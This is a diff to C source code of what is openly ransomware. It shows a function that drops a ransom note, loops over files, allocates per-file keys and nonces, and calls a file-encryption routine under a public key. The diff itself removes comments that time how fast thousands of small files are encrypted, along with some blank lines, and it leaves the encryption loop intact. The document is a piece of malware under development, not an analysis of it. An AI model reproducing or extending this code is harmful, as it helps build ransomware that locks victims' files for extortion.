@@ -141,9 +141,6 @@ int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR direc
 		goto CLEANUP;
 	}
 	dropRansomNote(directoryName);
-	// 10387 small files -> 15039 ms to encrypt small files
-	// 53 medium files -> 6237 ms to encrypt medium files
-	// 25 large files -> 25000 ms to encrypt large files
 	do {
 
 		BYTE Microsoft_key[5] = { 41, 7, 216, 231, 100 };
@@ -201,7 +198,6 @@ int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR direc
 
 						key = (BYTE*)calloc(256, 1);
 
-
 						if (!key) {
 							free(fileName);
 							continue;
@@ -229,7 +225,6 @@ int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR direc
 							continue;
 						}
 						fileEncrypt(hCryptProv, publicKey, fileName, key, nonce);
-
 						free(fileName);
 						free(key);
 						free(nonce);
